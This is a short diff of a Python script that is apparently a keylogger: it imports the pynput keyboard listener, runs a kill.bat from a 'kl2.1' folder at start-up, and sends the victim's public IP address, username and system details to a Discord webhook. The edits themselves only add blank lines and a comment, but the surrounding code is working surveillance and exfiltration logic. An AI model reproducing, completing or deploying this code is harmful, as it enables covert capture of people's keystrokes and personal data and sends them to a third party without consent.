@@ -4,7 +4,6 @@ import threading
 import subprocess
 import time
 from pynput import keyboard
-
 import psutil
 
 # Discord webhook URL (replace with your own webhook URL)
@@ -29,6 +28,7 @@ special_keys = {
 }
 
 username = os.getlogin()
+
 def run_bat_file():
     """Run the kill.bat file when the script starts."""
     bat_file_path = rf"C:\users\{username}\kl2.1\kill.bat"  # Update the path to your kill.bat file
@@ -107,6 +107,7 @@ public_ip = get_public_ip()
 send_to_webhook(f"Connection established. Public IP address: {public_ip}")
 send_to_webhook(f"Current user: {username}")
 
+# Gather system information
 cpu_count = psutil.cpu_count(logical=True)
 cpu_percent = psutil.cpu_percent(interval=1)
 memory_info = psutil.virtual_memory()
